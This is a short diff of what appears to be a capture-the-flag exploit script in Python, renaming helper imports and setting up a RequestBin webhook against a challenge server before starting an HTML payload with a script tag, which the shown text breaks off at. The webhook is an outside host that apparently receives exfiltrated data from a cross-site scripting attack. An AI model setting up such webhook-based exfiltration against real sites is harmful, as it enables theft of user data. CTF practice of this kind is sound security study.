@@ -2,13 +2,13 @@ import sys
 sys.path.append('../')
 
 import WebUtils
-from WebUtils.HTTPSync import *
-from WebUtils.HTTPHost import http_host
-from WebUtils.HTTPWebhook import RequestBinWebHook
+from WebUtils.Sync import *
+from WebUtils.Host import http_host
+from WebUtils.Webhook import RequestBinWebhook
 
 WebUtils.setBaseURL('http://chall.polygl0ts.ch:9010/')
 
-with RequestBinWebHook("enbit6i3l2ra4") as hook:
+with RequestBinWebhook("enbit6i3l2ra4") as hook:
     src_html = """
     <body>
     <script>
